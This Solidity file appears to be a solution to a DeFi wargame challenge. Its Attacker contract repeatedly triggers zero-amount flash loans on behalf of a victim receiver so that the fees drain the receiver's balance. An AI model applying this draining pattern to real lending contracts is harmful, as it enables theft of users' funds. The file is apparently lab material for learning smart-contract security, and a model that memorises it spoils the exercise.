pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./NaiveReceiverLenderPool.sol";

contract Attacker {
    using Address for address;

    function attack(NaiveReceiverLenderPool pool, address payable user) external {
        for (uint256 i = 0; i <= user.balance; i++) {
            pool.flashLoan(user, 0);
        }
    }
}